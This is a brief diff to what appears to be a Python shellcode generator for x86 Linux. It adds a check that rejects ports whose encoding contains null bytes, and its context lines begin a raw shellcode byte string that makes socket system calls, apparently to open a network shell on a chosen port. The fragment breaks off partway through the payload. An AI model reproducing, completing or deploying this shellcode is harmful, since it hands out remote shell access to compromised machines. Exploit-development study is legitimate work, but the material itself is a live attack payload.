@@ -25,6 +25,9 @@ elif (len_hex == 3):
 else:
 	sys.exit("[-] Please enter a valid port")
 
+if ("00" in port_op):
+	sys.exit("[-] Please enter a valid port")
+	
 code = (
 "\\x31\\xc0\\x50\\x40\\x50\\x89\\xc3\\x40\\x89\\xc7"
 "\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31"
